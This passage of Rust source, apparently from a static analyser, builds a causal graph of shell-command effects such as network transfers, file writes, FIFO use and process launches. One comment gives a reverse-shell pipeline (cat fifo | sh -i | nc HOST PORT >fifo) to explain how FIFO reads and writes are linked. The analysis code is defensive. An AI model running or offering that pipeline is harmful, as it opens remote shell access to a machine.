                CausalAssurance::Conservative
            },
            Modality::May,
            None,
            evidence,
        );
    }

    let mut effect_nodes = Vec::with_capacity(effects.len());
    let mut effect_modalities = Vec::with_capacity(effects.len());
    let mut effect_inputs: BTreeMap<usize, OccurrenceId> = BTreeMap::new();
    let mut effect_outputs: BTreeMap<usize, OccurrenceId> = BTreeMap::new();
    for (index, effect) in effects.iter().enumerate() {
        let span = graph.span(&effect.provenance);
        let node_origin = origin(subject, execution_graph, Some(effect.execution));
        let node = graph.node(
            node_origin.clone(),
            span,
            format!("resource_interaction:{}", effect.operation.0),
            OccurrenceKind::ResourceInteraction {
                operation: effect.operation.clone(),
                resource: effect.resource.clone(),
                attributes: effect.attributes.clone(),
            },
            Some(effect.execution),
            effect.realm.clone(),
            effect.modality,
            effect.condition.clone(),
            effect.provenance.clone(),
        );
        if let Some(code) = code_nodes
            .get(effect.execution.0 as usize)
            .and_then(Option::as_ref)
        {
            graph.edge(
                Some(code),
                node.as_ref(),
                CausalReason::ControlDependency,
                CausalAssurance::Conservative,
                effect.modality,
                effect.condition.clone(),
                effect.provenance.clone(),
            );
        }
        let typed_port = match effect.operation.0.as_str() {
            "network.upload" => Some((Port::HttpRequestBody, true)),
            operation if operation.starts_with("network.") => Some((Port::HttpResponseBody, false)),
            "database.read" => Some((Port::SqlResult, false)),
            operation if operation.starts_with("database.") => Some((Port::SqlInput, true)),
            _ => None,
        };
        if let Some((port, input)) = typed_port {
            let port_node = graph.node(
                node_origin,
                span,
                format!(
                    "resource_interaction:{}:port:{}",
                    effect.operation.0,
                    port_key(&port)
                ),
                OccurrenceKind::Port { port },
                Some(effect.execution),
                effect.realm.clone(),
                effect.modality,
                effect.condition.clone(),
                effect.provenance.clone(),
            );
            if input {
                graph.edge(
                    port_node.as_ref(),
                    node.as_ref(),
                    CausalReason::ValueDependency,
                    if matches!(
                        effect.operation.as_str(),
                        "network.upload" | "network.download" | "network.request"
                    ) && execution_graph.nodes[effect.execution.0 as usize].assurance
                        == effinterp_proto::ExecutionAssurance::Exact
                    {
                        CausalAssurance::Exact
                    } else {
                        CausalAssurance::Conservative
                    },
                    effect.modality,
                    effect.condition.clone(),
                    effect.provenance.clone(),
                );
                if let Some(port_node) = port_node {
                    for ((execution, _), (_, argument_port)) in &argument_nodes {
                        if *execution == effect.execution.0 {
                            graph.edge(
                                Some(argument_port),
                                Some(&port_node),
                                CausalReason::ValueDependency,
                                CausalAssurance::Conservative,
                                effect.modality,
                                effect.condition.clone(),
                                effect.provenance.clone(),
                            );
                        }
                    }
                    effect_inputs.insert(index, port_node);
                }
            } else {
                graph.edge(
                    node.as_ref(),
                    port_node.as_ref(),
                    CausalReason::ValueDependency,
                    if matches!(
                        effect.operation.as_str(),
                        "network.upload" | "network.download" | "network.request"
                    ) && execution_graph.nodes[effect.execution.0 as usize].assurance
                        == effinterp_proto::ExecutionAssurance::Exact
                    {
                        CausalAssurance::Exact
                    } else {
                        CausalAssurance::Conservative
                    },
                    effect.modality,
                    effect.condition.clone(),
                    effect.provenance.clone(),
                );
                if let Some(port_node) = port_node {
                    effect_outputs.insert(index, port_node);
                }
            }
        }
        effect_nodes.push(node);
        effect_modalities.push(effect.modality);
    }

    for (index, boundary) in boundaries.iter().enumerate() {
        let span = graph.span(&boundary.provenance);
        graph.node(
            origin(subject, execution_graph, None),
            span,
            format!("boundary:{}:{index}", boundary.reason.as_str()),
            OccurrenceKind::Boundary {
                reason: boundary.reason.clone(),
                limit: boundary.limit.clone(),
                detail: boundary.detail.clone(),
            },
            None,
            ExecutionRealm::Host,
            Modality::May,
            None,
            boundary.provenance.clone(),
        );
    }

    let mut stage_ports: BTreeMap<(u32, Port), OccurrenceId> = BTreeMap::new();
    for (stage_index, stage) in stages.iter().enumerate() {
        let mut ports = BTreeSet::new();
        for binding in &stage.bindings {
            for end in [&binding.from, &binding.to] {
                if let BindEnd::Port(port) = end {
                    ports.insert(port.clone());
                }
            }
        }
        for edge in stage_edges {
            if edge.from.stage == stage_index as u32 {
                ports.insert(edge.from.port.clone());
            }
            if edge.to.stage == stage_index as u32 {
                ports.insert(edge.to.port.clone());
            }
        }
        let execution = stage.execution.or_else(|| {
            stage
                .effects
                .iter()
                .find_map(|effect| effects.get(*effect as usize).map(|effect| effect.execution))
        });
        let realm = execution
            .and_then(|reference| execution_graph.nodes.get(reference.0 as usize))
            .map(|node| node.realm.clone())
            .unwrap_or_default();
        let span = graph.span(&stage.provenance);
        for port in ports {
            // Reuse a command's own stream occurrence. Stages without an
            // execution (echo/printf) keep a stage-private port so a
            // redirected write cannot consume the shell's shared stdout.
            let existing = stage.execution.and_then(|reference| match &port {
                Port::Arg(argument) => argument_nodes
                    .get(&(reference.0, *argument))
                    .map(|(_, port)| port),
                Port::Code => code_nodes
                    .get(reference.0 as usize)
                    .and_then(Option::as_ref),
                Port::Stdin | Port::Stdout | Port::Stderr => {
                    execution_stream_nodes.get(&(reference.0, port.clone()))
                }
                _ => None,
            });
            if let Some(existing) = existing {
                stage_ports.insert((stage_index as u32, port), existing.clone());
                continue;
            }
            let id = graph.node(
                origin(subject, execution_graph, execution),
                span,
                format!("stage:{stage_index}:port:{}", port_key(&port)),
                OccurrenceKind::Port { port: port.clone() },
                execution,
                realm.clone(),
                Modality::May,
                None,
                stage.provenance.clone(),
            );
            if let Some(id) = id {
                // Multiple stages can bind the same execution's descriptors
                // (for example its command and its launcher's socket wiring).
                if let Some(execution) = stage.execution
                    && matches!(port, Port::Stdin | Port::Stdout | Port::Stderr)
                {
                    execution_stream_nodes.insert((execution.0, port.clone()), id.clone());
                }
                stage_ports.insert((stage_index as u32, port), id);
            }
        }
    }

    let binding_node = |stage: u32,
                        end: &BindEnd,
                        stage_ports: &BTreeMap<(u32, Port), OccurrenceId>,
                        effect_nodes: &[Option<OccurrenceId>]| {
        match end {
            BindEnd::Port(port) => stage_ports.get(&(stage, port.clone())).cloned(),
            BindEnd::Effect(effect) => effect_nodes.get(*effect as usize)?.clone(),
        }
    };
    // Socket redirects bind directly to shell streams. Keep that edge instead
    // of routing it through the generic HTTP body port that every network
    // transfer also receives.
    let socket_transfer = |effect: &u32| {
        effects.get(*effect as usize).is_some_and(|effect| {
            matches!(
                effect.operation.0.as_str(),
                "network.download" | "network.upload"
            ) && matches!(
                effect.attributes.get("protocol"),
                Some(AttrValue::String(protocol)) if protocol == "tcp" || protocol == "udp"
            )
        })
    };
    for (stage_index, stage) in stages.iter().enumerate() {
        for binding in &stage.bindings {
            let mut from = binding_node(
                stage_index as u32,
                &binding.from,
                &stage_ports,
                &effect_nodes,
            );
            let mut to = binding_node(stage_index as u32, &binding.to, &stage_ports, &effect_nodes);
            if let BindEnd::Effect(effect) = &binding.from
                && !(binding.to == BindEnd::Port(Port::Stdin) && socket_transfer(effect))
                && let Some(output) = effect_outputs.get(&(*effect as usize))
            {
                from = Some(output.clone());
            }
            if let BindEnd::Effect(effect) = &binding.to
                && !(matches!(&binding.from, BindEnd::Port(Port::Stdout | Port::Stderr))
                    && socket_transfer(effect))
                && let Some(input) = effect_inputs.get(&(*effect as usize))
            {
                to = Some(input.clone());
            }
            let from_modality = match binding.from {
                BindEnd::Effect(effect) => effect_modalities
                    .get(effect as usize)
                    .copied()
                    .unwrap_or(Modality::May),
                BindEnd::Port(_) => Modality::May,
            };
            let to_modality = match binding.to {
                BindEnd::Effect(effect) => effect_modalities
                    .get(effect as usize)
                    .copied()
                    .unwrap_or(Modality::May),
                BindEnd::Port(_) => Modality::May,
            };
            let from_condition = match binding.from {
                BindEnd::Effect(effect) => effects
                    .get(effect as usize)
                    .and_then(|effect| effect.condition.as_ref()),
                BindEnd::Port(_) => None,
            };
            let to_condition = match binding.to {
                BindEnd::Effect(effect) => effects
                    .get(effect as usize)
                    .and_then(|effect| effect.condition.as_ref()),
                BindEnd::Port(_) => None,
            };
            graph.edge(
                from.as_ref(),
                to.as_ref(),
                CausalReason::ValueDependency,
                binding.assurance,
                edge_modality(from_modality, to_modality),
                conditions(from_condition, to_condition),
                stage.provenance.clone(),
            );
        }
    }
    for edge in stage_edges {
        graph.edge(
            stage_ports.get(&(edge.from.stage, edge.from.port.clone())),
            stage_ports.get(&(edge.to.stage, edge.to.port.clone())),
            CausalReason::ValueDependency,
            edge.assurance,
            Modality::May,
            None,
            edge.provenance.clone(),
        );
    }

    // A program's spawn is what makes it interpret its code, so within one
    // execution the two occurrences are ordered. Keyed on the execution node
    // rather than on the resource identity, which the spawn carries with an
    // argv the interpretation does not.
    let mut interpretations: BTreeMap<u32, Vec<usize>> = BTreeMap::new();
    for (index, effect) in effects.iter().enumerate() {
        if effect.operation.as_str() == "process.code_execution" {
            interpretations
                .entry(effect.execution.0)
                .or_default()
                .push(index);
        }
    }
    for (spawn, effect) in effects.iter().enumerate() {
        if effect.operation.as_str() != "process.exec" {
            continue;
        }
        for &interpretation in interpretations
            .get(&effect.execution.0)
            .map(Vec::as_slice)
            .unwrap_or_default()
        {
            graph.edge(
                effect_nodes.get(spawn).and_then(Option::as_ref),
                effect_nodes.get(interpretation).and_then(Option::as_ref),
                CausalReason::ControlDependency,
                CausalAssurance::Conservative,
                edge_modality(effect.modality, effects[interpretation].modality),
                conditions(
                    effect.condition.as_ref(),
                    effects[interpretation].condition.as_ref(),
                ),
                effects[interpretation].provenance.clone(),
            );
        }
    }

    // A FIFO created here transports bytes, not stored file state. Keep its
    // lifetime and rename evidence separate from lexical path transitions.
    // A path the host answered as a FIFO before this command ran transports
    // bytes the same way, so its answered identity joins the created ones.
    let observed_fifos = observed_fifo_paths(provenance);
    let mut fifo_paths: BTreeMap<String, (usize, Vec<usize>)> = BTreeMap::new();
    let mut fifo_accesses: BTreeMap<usize, Vec<(usize, Vec<usize>)>> = BTreeMap::new();
    let mut renamed_fifos = BTreeMap::new();
    let opaque_commands: Vec<_> = boundaries
        .iter()
        .filter(|boundary| {
            matches!(
                boundary.reason.as_str(),
                "unmodeled_command" | "unresolved_command"
            )
        })
        .map(|boundary| graph.span(&boundary.provenance))
        .collect();
    // Pipeline stages open their redirections and run together, so code a
    // stage runs cannot replace a FIFO its sibling stages already hold open:
    // `cat fifo | sh -i | nc HOST PORT >fifo` still joins nc's writes to
    // cat's reads. The reset waits until an effect outside the pipeline.
    let mut pipe_links: BTreeMap<u32, Vec<u32>> = BTreeMap::new();
    for (index, node) in execution_graph.nodes.iter().enumerate() {
        let streams = &node.streams;
        let piped = [
            streams
                .stdin
                .as_ref()
                .filter(|from| from.stream != effinterp_proto::ExecutionStream::Stdin),
            streams
                .stdout
                .as_ref()
                .filter(|to| to.stream == effinterp_proto::ExecutionStream::Stdin),
            streams
                .stderr
                .as_ref()
                .filter(|to| to.stream == effinterp_proto::ExecutionStream::Stdin),
        ];
        for other in piped.into_iter().flatten() {
            pipe_links
                .entry(index as u32)
                .or_default()
                .push(other.node.0);
            pipe_links
                .entry(other.node.0)
                .or_default()
                .push(index as u32);
        }
    }
    let pipeline_span = |execution: ExecutionNodeRef| -> Option<ByteSpan> {
        let mut seen = BTreeSet::from([execution.0]);
        let mut pending = vec![execution.0];
        while let Some(node) = pending.pop() {
            for next in pipe_links.get(&node).into_iter().flatten() {
                if seen.insert(*next) {
                    pending.push(*next);
                }
            }
        }
        if seen.len() < 2 {
            return None;
        }
        seen.iter()
            .filter_map(|node| execution_graph.nodes.get(*node as usize)?.source_span)
            .reduce(|a, b| ByteSpan {
                start: a.start.min(b.start),
                end: a.end.max(b.end),
            })
    };
    let mut pending_reset: Option<ByteSpan> = None;
    for (index, effect) in effects.iter().enumerate() {
        if let Some(pipeline) = pending_reset {
            let at = graph.span(&effect.provenance);
            if at.end == 0 || at.start < pipeline.start || at.end > pipeline.end {
                fifo_paths.clear();
                renamed_fifos.clear();
                pending_reset = None;
            }
        }
        if effect.operation.as_str() == "process.code_execution"
            || effect.operation.as_str() == "process.exec"
                && opaque_commands.iter().any(|span| {
                    let command = graph.span(&effect.provenance);
                    span.start < command.end && command.start < span.end
                })
        {
            match pipeline_span(effect.execution) {
                Some(pipeline) => {
                    pending_reset = Some(pending_reset.map_or(pipeline, |pending| ByteSpan {
                        start: pending.start.min(pipeline.start),
                        end: pending.end.max(pipeline.end),
                    }));
                }
                None => {
                    fifo_paths.clear();
                    renamed_fifos.clear();
                }
            }
        }
        let Some(path) = concrete_fs_path(effect) else {
            if matches!(
                effect.operation.as_str(),
                "filesystem.create" | "filesystem.delete" | "filesystem.move" | "filesystem.write"
            ) {
                fifo_paths.clear();
                renamed_fifos.clear();
            }
            continue;
        };
        let Some(key) = resource_transition_key(effect) else {
            continue;
        };
        if effect.operation.as_str() == "filesystem.delete" {
            // The recorded pairing supplies the destination; a move on the
            // same source distinguishes a rename from an unrelated deletion.
            if let Some((fifo, evidence)) = fifo_paths.get(&key)
                && effect.condition.is_none()
                && effects.iter().any(|candidate| {
                    candidate.operation.as_str() == "filesystem.move"
                        && candidate.execution == effect.execution
                        && candidate.realm == effect.realm
                        && candidate.resource == effect.resource
                        && candidate.condition.is_none()
                })
            {
                let destinations: Vec<_> = transfer_bindings
                    .iter()
                    .filter(|binding| binding.source as usize == index)
                    .collect();
                if let [binding] = destinations.as_slice() {
                    let destination = binding.destination as usize;
                    if destination > index
                        && let Some(target) = effects.get(destination)
                        && target.operation.as_str() == "filesystem.write"
                        && target.realm == effect.realm
                        && target.execution == effect.execution
                        && target.condition.is_none()
                        && concrete_fs_path(target).is_some()
                        && transfer_bindings
                            .iter()
                            .filter(|binding| binding.destination as usize == destination)
                            .count()
                            == 1
                    {
                        let mut evidence = evidence.clone();
                        evidence.extend([index, destination]);
                        renamed_fifos.insert(destination, (*fifo, evidence));
                    }
                }
            }
        }
        match effect.operation.as_str() {
            "filesystem.create" | "filesystem.delete" => {
                fifo_paths.retain(|_, (_, evidence)| {
                    let latest = &effects[*evidence.last().unwrap()];
                    latest.realm != effect.realm
                        || !concrete_fs_path(latest)
                            .is_some_and(|known| known == path || fs_path_contains(path, known))
                });
                if effect.operation.as_str() == "filesystem.create"
                    && effect.attributes.get("fifo") == Some(&AttrValue::Bool(true))
                    && effect.request_assurance == effinterp_proto::RequestAssurance::Exact
                    && effect.condition.is_none()
                {
                    fifo_paths.insert(key, (index, vec![index]));
                }
            }
            "filesystem.write"
                if transfer_bindings.iter().any(|binding| {
                    binding.destination as usize == index
                        && effects
                            .get(binding.source as usize)
                            .is_some_and(|source| source.operation.as_str() == "filesystem.delete")
                }) =>
            {
                fifo_paths.remove(&key);
                if let Some(identity) = renamed_fifos.remove(&index) {
                    fifo_paths.insert(key, identity);
                }
            }
            "filesystem.read" | "filesystem.write" => {
                // The observed kind describes initial state, so an access that
                // follows this command's own create or delete of the path is
                // left to the created-FIFO evidence above.
                if effect.attributes.get("metadata") != Some(&AttrValue::Bool(true))
                    && !fifo_paths.contains_key(&key)
                    && effect.realm == ExecutionRealm::Host
                    && observed_fifos.contains(path)
                {
                    fifo_paths.insert(key.clone(), (index, vec![index]));
                }
                if effect.attributes.get("metadata") != Some(&AttrValue::Bool(true))
                    && let Some((fifo, evidence)) = fifo_paths.get(&key)
                {
                    fifo_accesses
                        .entry(*fifo)
                        .or_default()
                        .push((index, evidence.clone()));
                }
            }
            _ => {}
        }
    }
    if !fifo_accesses.is_empty() {
        // An opaque process's stdout alone does not establish its bytes. Walk
        // only existing byte bindings, without promoting their assurance.
        let process_nodes: BTreeSet<_> = graph
            .nodes
            .iter()
            .filter(|node| {
                matches!(&node.occurrence,
                OccurrenceKind::ResourceInteraction { operation, .. }
                    if operation.domain() == "process")
            })
            .map(|node| node.id.clone())
            .collect();
        let mut byte_sources: BTreeSet<_> = graph
            .nodes
            .iter()
            .filter(|node| match &node.occurrence {
                OccurrenceKind::Value {
                    value: ResourceExpr::Literal { .. },
                } => true,
                OccurrenceKind::ResourceInteraction {
                    operation,
                    attributes,
                    ..
                } => {
                    matches!(
                        operation.as_str(),
                        "filesystem.read" | "network.download" | "environment.read"
                    ) && attributes.get("metadata") != Some(&AttrValue::Bool(true))
                }
                _ => false,
            })
            .map(|node| node.id.clone())
            .collect();
        let mut successors: BTreeMap<_, Vec<_>> = BTreeMap::new();
        for edge in &graph.edges {
            if edge.reason == CausalReason::ValueDependency
                && !process_nodes.contains(&edge.from)
                && !process_nodes.contains(&edge.to)
            {
                successors
                    .entry(edge.from.clone())
                    .or_default()
                    .push(edge.to.clone());
            }
        }
        for binding in transfer_bindings {
            if let (Some(from), Some(to)) = (
                effect_nodes
                    .get(binding.source as usize)
                    .and_then(Option::as_ref),
                effect_nodes
                    .get(binding.destination as usize)
                    .and_then(Option::as_ref),
            ) {
                successors.entry(from.clone()).or_default().push(to.clone());
            }
        }
        let mut pending: Vec<_> = byte_sources.iter().cloned().collect();
        while let Some(node) = pending.pop() {
            for next in successors.get(&node).into_iter().flatten() {
                if byte_sources.insert(next.clone()) {
                    pending.push(next.clone());
                }
            }
        }
        for accesses in fifo_accesses.values() {
            let writers: Vec<_> = accesses
                .iter()
                .filter(|(index, _)| effects[*index].operation.as_str() == "filesystem.write")
                .collect();
            let readers: Vec<_> = accesses
                .iter()
                .filter(|(index, _)| effects[*index].operation.as_str() == "filesystem.read")
                .collect();
            for (writer, writer_evidence) in &writers {
                for (reader, reader_evidence) in &readers {
                    if graph.edges.len() >= graph.max_edges {
                        graph.saturated_edges = true;
                        break;
                    }
                    let source = &effects[*writer];
                    let destination = &effects[*reader];
                    let writer_branches = branch_path(source.condition.as_ref());
                    let reader_branches = branch_path(destination.condition.as_ref());
                    if writer_branches.iter().any(|a| {
                        reader_branches
                            .iter()
                            .any(|b| a.group == b.group && a.arm != b.arm)
                    }) {
                        continue;
                    }
                    let from = effect_nodes.get(*writer).and_then(Option::as_ref);
                    let mut evidence = writer_evidence.clone();
                    evidence.extend(reader_evidence.iter().copied());
                    evidence.extend([*writer, *reader]);
                    let mut provenance: Vec<_> = evidence
                        .iter()
                        .flat_map(|index| effects[*index].provenance.iter().copied())
                        .collect();
                    provenance.sort();
                    provenance.dedup();
                    graph.edge(
                        from,
                        effect_nodes.get(*reader).and_then(Option::as_ref),
                        CausalReason::ResourceTransfer,
                        if writers.len() == 1
                            && readers.len() == 1
                            && from.is_some_and(|node| byte_sources.contains(node))
                        {
                            CausalAssurance::Exact
                        } else {
                            CausalAssurance::Conservative
                        },
                        Modality::May,
                        conditions(source.condition.as_ref(), destination.condition.as_ref()),
                        provenance,
                    );
                }
            }
        }
    }

    // Ordered state transitions per resource. The frontier holds the
    // occurrences that can still be the most recent state of the resource;
    // branch arms are walked as a structured stack so an arm's occurrences
    // never chain into a sibling arm, and a construct whose arms cover every
    // path retires the state that preceded it.
    let mut frontiers: BTreeMap<String, ResourceFrontier> = BTreeMap::new();
    for (index, effect) in effects.iter().enumerate() {
        let Some(key) = resource_transition_key(effect) else {
            continue;
        };
        let frontier = frontiers.entry(key).or_default();
        frontier.enter(&branch_path(effect.condition.as_ref()));
        for previous in std::mem::replace(&mut frontier.current, vec![index]) {
            let previous_effect = &effects[previous];
            let exact_stored_read = previous_effect.operation.as_str() == "filesystem.write"
                && effect.operation.as_str() == "filesystem.read"
                && previous_effect.realm == effect.realm
                && concrete_fs_path(previous_effect)
                    .zip(concrete_fs_path(effect))
                    .is_some_and(|(written, read)| written == read)
                && transfer_bindings.iter().any(|binding| {
                    binding.destination as usize == previous
                        && binding.assurance == CausalAssurance::Exact
                })
                && execution_graph
                    .nodes
                    .get(previous_effect.execution.0 as usize)
                    .and_then(|execution| execution.source_span)
                    .is_some_and(|span| {
                        condition_requires_short_circuit_success(effect.condition.as_ref(), span)
                    })
                && !effects[previous + 1..index].iter().any(|candidate| {
                    if candidate.realm != effect.realm
                        || !matches!(
                            candidate.operation.as_str(),
                            "filesystem.create"
                                | "filesystem.delete"
                                | "filesystem.move"
                                | "filesystem.write"
                        )
                    {
                        return false;
                    }
                    let Some(written) = concrete_fs_path(previous_effect) else {
                        return true;
                    };
                    concrete_fs_path(candidate).is_none_or(|path| {
                        path == written
                            || fs_path_contains(path, written)
                            || fs_path_contains(written, path)
                    })
                });
            graph.edge(
                effect_nodes.get(previous).and_then(Option::as_ref),
                effect_nodes.get(index).and_then(Option::as_ref),
                CausalReason::ResourceTransition,
                if exact_stored_read {
                    CausalAssurance::Exact
                } else {
                    CausalAssurance::Conservative
                },
                match (&effects[previous].resource, &effect.resource) {
                    (
                        ResourceExpr::Concrete { identity: previous },
                        ResourceExpr::Concrete { identity: current },
                    ) if effinterp_proto::compare_scoped_identity(previous, current)
                        == Some(effinterp_proto::ScopeMatch::Possible) =>
                    {
                        Modality::May
                    }
                    _ => edge_modality(effects[previous].modality, effect.modality),
                },
                conditions(
                    effects[previous].condition.as_ref(),
                    effect.condition.as_ref(),
                ),
                effect.provenance.clone(),
            );
        }
    }

    // A directory read sees what an earlier write put inside it, so a write
    // under a directory transitions that directory's state too. Paths are
    // compared lexically and only a concrete descendant counts; nothing is
    // assumed about a symbolic resource. A read of a path an earlier
    // pattern write may have written, such as a member an extraction put
    // under its target, sees that write too.
    let mut written_paths: BTreeMap<&str, Vec<usize>> = BTreeMap::new();
    let mut written_patterns: Vec<(usize, &str)> = Vec::new();
    for (index, effect) in effects.iter().enumerate() {
        if effect.operation.0 == "filesystem.write"
            && let ResourceExpr::Pattern {
                pattern: effinterp_proto::ResourcePattern::FsPath { glob },
            } = &effect.resource
        {
            written_patterns.push((index, glob));
            continue;
        }
        let Some(path) = concrete_fs_path(effect) else {
            continue;
        };
        if effect.operation.0 == "filesystem.read" {
            for (writer, glob) in &written_patterns {
                if effects[*writer].realm != effect.realm
                    || !effinterp_proto::glob_match(glob, path).unwrap_or(true)
                {
                    continue;
                }
                graph.edge(
                    effect_nodes.get(*writer).and_then(Option::as_ref),
                    effect_nodes.get(index).and_then(Option::as_ref),
                    CausalReason::ResourceTransition,
                    CausalAssurance::Conservative,
                    Modality::May,
                    conditions(
                        effects[*writer].condition.as_ref(),
                        effect.condition.as_ref(),
                    ),
                    effect.provenance.clone(),
                );
            }
            let prefix = path.strip_suffix('/').unwrap_or(path);
            for (member, writers) in written_paths.range(path..) {
                if !member.starts_with(prefix) {
                    break;
                }
                if !fs_path_contains(path, member) {
                    continue;
                }
                for writer in writers {
                    if effects[*writer].realm != effect.realm {
                        continue;
                    }
                    graph.edge(
                        effect_nodes.get(*writer).and_then(Option::as_ref),
                        effect_nodes.get(index).and_then(Option::as_ref),
                        CausalReason::ResourceTransition,
                        CausalAssurance::Conservative,
                        Modality::May,
                        conditions(
                            effects[*writer].condition.as_ref(),
                            effect.condition.as_ref(),
                        ),
                        effect.provenance.clone(),
                    );
                }
            }
        }
        if matches!(
            effect.operation.0.as_str(),
            "filesystem.write" | "filesystem.create"
        ) {
            written_paths.entry(path).or_default().push(index);
        }
    }

    // Source-to-destination transfers, from the pairings the models and
    // language APIs recorded while lowering. Only an identical edge between
    // identical occurrence endpoints is dropped, so two identical calls keep
    // their own pairing; a pairing whose endpoint occurrence was refused by a
    // graph limit contributes nothing rather than a fabricated edge.
    let mut transfer_edges = BTreeSet::new();
    for binding in transfer_bindings {
        let (Some(source), Some(destination)) = (
            effects.get(binding.source as usize),
            effects.get(binding.destination as usize),
        ) else {
            continue;
        };
        let from = effect_nodes
            .get(binding.source as usize)
            .and_then(Option::as_ref);
        let to = effect_nodes
            .get(binding.destination as usize)
            .and_then(Option::as_ref);
        let (Some(from), Some(to)) = (from, to) else {
            continue;
        };
        if !transfer_edges.insert((from.clone(), to.clone())) {
            continue;
        }
        let mut provenance = source.provenance.clone();
        provenance.extend(destination.provenance.iter().copied());
        provenance.sort();
        provenance.dedup();
        graph.edge(
            Some(from),
            Some(to),
            CausalReason::ResourceTransfer,
            binding.assurance,
            edge_modality(source.modality, destination.modality),
            conditions(source.condition.as_ref(), destination.condition.as_ref()),
            provenance,
        );
    }

    // An unconditional later read of a regular file can consume the exact
    // audited content written earlier in this execution. This supplements the
    // exact short-circuit transition above: only a concrete exact write with
    // an exact input binding qualifies, and an intervening replacement keeps
    // the existing conservative state edge as the only claim.
    for (writer, source) in effects.iter().enumerate().filter(|(_, effect)| {
        effect.operation.as_str() == "filesystem.write"
            && effect.request_assurance == effinterp_proto::RequestAssurance::Exact
            && effect.condition.is_none()
            && concrete_fs_path(effect).is_some()
    }) {
        let Some(writer_path) = concrete_fs_path(source) else {
            continue;
        };
        let Some(writer_node) = effect_nodes.get(writer).and_then(Option::as_ref) else {
            continue;
        };
        let audited = graph.edges.iter().any(|edge| {
            edge.to == *writer_node
                && edge.assurance == CausalAssurance::Exact
                && matches!(
                    edge.reason,
                    CausalReason::ValueDependency | CausalReason::ResourceTransfer
                )
        });
        if !audited {
            continue;
        }
        for (reader, destination) in
            effects
                .iter()
                .enumerate()
                .skip(writer + 1)
                .filter(|(_, effect)| {
                    effect.operation.as_str() == "filesystem.read"
                        && effect.realm == source.realm
                        && effect.condition.is_none()
                        && concrete_fs_path(effect)
                            .is_some_and(|path| fs_path_contains(path, writer_path))
                })
        {
            let replaced = effects[writer + 1..reader].iter().any(|effect| {
                let Some(path) = concrete_fs_path(effect) else {
                    return false;
                };
                let overlaps =
                    fs_path_contains(path, writer_path) || fs_path_contains(writer_path, path);
                overlaps
                    && (matches!(
                        effect.operation.as_str(),
                        "filesystem.delete" | "filesystem.move" | "filesystem.create"
                    ) || effect.operation.as_str() == "filesystem.write"
                        && effect.attributes.get("append") != Some(&AttrValue::Bool(true)))
            });
            if replaced || graph.edges.len() >= graph.max_edges {
                if graph.edges.len() >= graph.max_edges {
                    graph.saturated_edges = true;
                }
                continue;
            }
            let Some(reader_node) = effect_nodes.get(reader).and_then(Option::as_ref) else {
                continue;
            };
            let mut provenance = source.provenance.clone();
            provenance.extend(destination.provenance.iter().copied());
            provenance.sort();
            provenance.dedup();
            graph.edge(
                Some(writer_node),
                Some(reader_node),
                CausalReason::ResourceTransfer,
                CausalAssurance::Exact,
                Modality::May,
                None,
                provenance,
            );
        }
    }

    // A selected file supplies code to its direct execution. Its raw content
    // identity belongs to the input; causal edges connect the read and effects.
    for (index, execution) in execution_graph.nodes.iter().enumerate() {
        let Some(input) = &execution.input else {
            continue;
        };
        if !matches!(
            input.content,
            effinterp_proto::ExecutionContent::Observed { .. }
                | effinterp_proto::ExecutionContent::Predicted { .. }
        ) {
            continue;
        }
        let Some(path) = execution.selected_source_path() else {
            continue;
        };
        let resource = ResourceExpr::Concrete {
            identity: effinterp_proto::ResourceIdentity::FsPath {
                path: path.to_string(),
            },
        };
        let code = code_nodes.get(index).and_then(Option::as_ref);
        for (effect_index, effect) in effects.iter().enumerate() {
            if effect.execution != input.requester {
                continue;
            }
            let effect_node = effect_nodes.get(effect_index).and_then(Option::as_ref);
            let same_site = !effect.provenance.is_empty()
                && effect
                    .provenance
                    .iter()
                    .all(|reference| execution.evidence.contains(reference));
            if effect.operation.as_str() == "filesystem.read" && effect.resource == resource {
                graph.edge(
                    effect_node,
                    code,
                    CausalReason::ValueDependency,
                    CausalAssurance::Conservative,
                    effect.modality,
                    effect.condition.clone(),
                    effect.provenance.clone(),
                );
            } else if effect.operation.as_str() == "process.code_execution"
                && (same_site
                    || (execution.evidence.is_empty()
                        && effect.resource
                            == (ResourceExpr::Concrete {
                                identity: crate::paths::executable_identity(
                                    &input.requester_component,
                                    None,
                                ),
                            })))
            {
                graph.edge(
                    code,
                    effect_node,
                    CausalReason::ControlDependency,
                    CausalAssurance::Conservative,
                    effect.modality,
                    effect.condition.clone(),
                    effect.provenance.clone(),
                );
            }
        }
    }

    for edge in &execution_graph.edges {
        let from = code_nodes
            .get(edge.from.0 as usize)
            .and_then(Option::as_ref);
        let to = code_nodes.get(edge.to.0 as usize).and_then(Option::as_ref);
        let modality = Modality::May;
        graph.edge(
            from,
            to,
            CausalReason::Launch,
            CausalAssurance::Conservative,
            modality,
            None,
            edge.evidence.clone(),
        );
        let Some(target) = execution_graph.nodes.get(edge.to.0 as usize) else {
            continue;
        };
        for (effect_index, effect) in effects.iter().enumerate() {
            if effect.execution == edge.from && launch_effect_matches(effect, target) {
                graph.edge(
                    effect_nodes.get(effect_index).and_then(Option::as_ref),
                    to,
                    CausalReason::Launch,
                    CausalAssurance::Conservative,
                    edge_modality(effect.modality, modality),
                    effect.condition.clone(),
                    edge.evidence.clone(),
                );
                if let ResourceExpr::Concrete {
                    identity: ResourceIdentity::Process { argv, .. },
                } = &effect.resource
                {
                    for (arg_index, value) in argv.iter().enumerate() {
                        if target.argv.get(arg_index + 1) == Some(value) {
                            graph.edge(
                                effect_nodes.get(effect_index).and_then(Option::as_ref),
                                argument_nodes
                                    .get(&(edge.to.0, (arg_index + 1) as u32))
                                    .map(|(_, port)| port),
                                CausalReason::Containment,
                                CausalAssurance::Conservative,
                                edge_modality(effect.modality, modality),
                                effect.condition.clone(),
                                edge.evidence.clone(),
                            );
                        }
                    }
                }
            }
        }
    }

    add_mount_aliases(&mut graph, effects, &effect_nodes);

    if graph.saturated_conditions {
        coverage = effinterp_proto::CoverageLevel::Partial;
        let old_limit = graph.max_nodes;
        graph.max_nodes = usize::MAX;
        graph.node(
            origin(subject, execution_graph, None),
            ByteSpan { start: 0, end: 0 },
            "boundary:condition_widened".to_string(),
            OccurrenceKind::Boundary {
                reason: BoundaryReason::LIMIT_SATURATED,
                limit: Some("max_causal_condition".to_string()),
                detail: Some("causal condition composition widened".to_string()),
            },
            None,
            ExecutionRealm::Host,
            Modality::May,
            None,
            Vec::new(),
        );
        graph.nodes.last_mut().unwrap().cardinality = CausalCardinality::WIDENED;
        graph.max_nodes = old_limit;
    }
    if graph.saturated_nodes || graph.saturated_edges {
        coverage = effinterp_proto::CoverageLevel::Partial;
